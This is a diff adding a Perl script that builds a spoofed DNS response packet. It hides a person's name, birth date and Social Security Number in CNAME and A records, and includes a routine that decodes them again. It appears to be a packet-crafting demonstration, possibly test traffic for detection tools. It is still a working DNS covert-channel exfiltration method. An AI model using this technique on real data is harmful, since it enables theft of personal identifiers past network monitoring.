@@ -1,0 +1,117 @@
+# IPv4 DNS SSN Exfil
+
+use Net::Frame::Layer::DNS 1.05 qw(:consts);
+use Net::Frame::Layer::DNS::Question qw(:consts);
+use Net::Frame::Layer::DNS::RR qw(:consts);
+
+print "First name and last name? ";
+my $name = <STDIN>;
+chomp $name;
+print "Birth date (YYYYMMDD)? ";
+my $date = <STDIN>;
+chomp $date;
+print "What Social Security Number? ";
+my $ssn = <STDIN>;
+chomp $ssn;
+print "\n";
+
+$name = $name || 'Johnny Fingers';
+$date = $date || '19900101';
+$ssn  = $ssn  || '234-98-1576';
+
+my ($first, $last) = split(/\s+/,$name);
+$date = '4' . $date;
+$date = join '.', unpack 'C4', pack 'N', $date;
+$ssn  =~ s/[\-\s+]//g;
+$ssn  = '1' . $ssn;
+$ssn  = join '.', unpack 'C4', pack 'N', $ssn;
+
+$ether = ETHER;
+$ipv4  = IPv4(src=>'8.8.8.8',protocol=>NF_IPv4_PROTOCOL_UDP,
+    dst=>'192.168.10.1');
+$udp   = UDP(src=>53,dst=>getRandom16bitsInt());
+$dns   = Net::Frame::Layer::DNS->new(
+    qr => 1,
+    flags => 0x18,
+    anCount => 4
+);
+$query = Net::Frame::Layer::DNS::Question->new(name=>'www.www.com');
+
+$rrf   = Net::Frame::Layer::DNS::RR->new(
+    name     => $query->name,
+    type     => NF_DNS_TYPE_CNAME,
+    class    => $query->class,
+    ttl      => 64,
+);
+$first = Net::Frame::Layer::DNS::RR::CNAME->new(
+    cname => 'www.' . $first . '.com'
+);
+$rrf->rdlength($first->getLength());
+
+$rrl   = Net::Frame::Layer::DNS::RR->new(
+    name     => $query->name,
+    type     => NF_DNS_TYPE_CNAME,
+    class    => $query->class,
+    ttl      => 64,
+);
+$last  = Net::Frame::Layer::DNS::RR::CNAME->new(
+    cname => 'www.' . $last . '.com'
+);
+$rrl->rdlength($last->getLength());
+
+$rrd   = Net::Frame::Layer::DNS::RR->new(
+    name     => $query->name,
+    type     => NF_DNS_TYPE_A,
+    class    => $query->class,
+    ttl      => 64,
+);
+$bday  = Net::Frame::Layer::DNS::RR::A->new(
+    address => $date
+);
+$rrd->rdlength(4);
+
+$rra   = Net::Frame::Layer::DNS::RR->new(
+    name     => $query->name,
+    type     => NF_DNS_TYPE_A,
+    class    => $query->class,
+    ttl      => 64,
+);
+$addr  = Net::Frame::Layer::DNS::RR::A->new(
+    address => $ssn
+);
+$rra->rdlength(4);
+
+$packet = packet $ether,$ipv4,$udp,$dns,$query,
+                 $rrf,$first,
+                 $rrl,$last,
+                 $rrd,$bday,
+                 $rra,$addr;
+
+decode $packet;
+print "\n\nType:\n\n  sendp \$packet\n\nto execute\n";
+print "\n\nType:\n\n  print join \" \", ssnExtract \$packet\n\nto extract\n";
+
+sub ssnExtract {
+    my ($packet) = @_;
+
+    my $first = $packet->cname6;
+    my $last  = $packet->cname8;
+    my $date  = $packet->address10;
+    my $ssn   = $packet->address12;
+
+    (undef, $first, undef) = split /\./, $first;
+    (undef, $last, undef)  = split /\./, $last;
+
+    $date = unpack N => pack CCCC => split /\./ => $date;
+    $date =~ s/^4//;
+    $date = substr($date,4,2) . "/" . 
+            substr($date,6,2) . "/" . 
+            substr($date,0,4);
+    $ssn  = unpack N => pack CCCC => split /\./ => $ssn;
+    $ssn  =~ s/^1//;
+    $ssn  = substr($ssn,0,3) . "-" . 
+            substr($ssn,3,2) . "-" . 
+            substr($ssn,5,4);
+
+    return ($first, $last, $date, $ssn);
+}
